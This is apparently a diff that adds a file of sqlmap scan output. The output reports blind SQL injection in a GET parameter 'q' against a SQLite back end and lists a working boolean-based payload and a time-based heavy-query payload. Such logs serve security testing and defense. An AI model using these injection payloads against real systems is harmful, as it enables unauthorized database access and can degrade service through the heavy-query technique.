@@ -1,0 +1,12 @@
+sqlmap identified the following injection point(s) with a total of 169 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=apple%' AND 9475=9475 AND 'CxNy%'='CxNy
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: q=apple%' AND 7839=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'gqyH%'='gqyH
+---
+back-end DBMS: SQLite
